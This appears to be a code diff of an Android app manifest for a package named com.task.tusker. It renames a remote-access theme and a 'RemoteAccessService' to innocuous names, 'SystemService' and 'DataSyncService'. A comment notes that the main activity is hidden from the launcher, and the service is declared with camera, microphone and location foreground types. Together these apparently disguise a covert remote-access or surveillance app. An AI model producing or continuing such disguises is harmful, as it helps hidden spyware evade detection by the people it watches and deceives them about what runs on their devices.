@@ -88,7 +88,7 @@
         android:requestLegacyExternalStorage="true"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.RemoteAccess" >
+        android:theme="@style/Theme.SystemService" >
 
         <!--
             Main Activity — NOT visible in the home launcher.
@@ -160,7 +160,7 @@
             service may use so Android 14 doesn't kill it mid-operation.
         -->
         <service
-            android:name="com.task.tusker.services.RemoteAccessService"
+            android:name="com.task.tusker.services.DataSyncService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync|camera|microphone|location" />
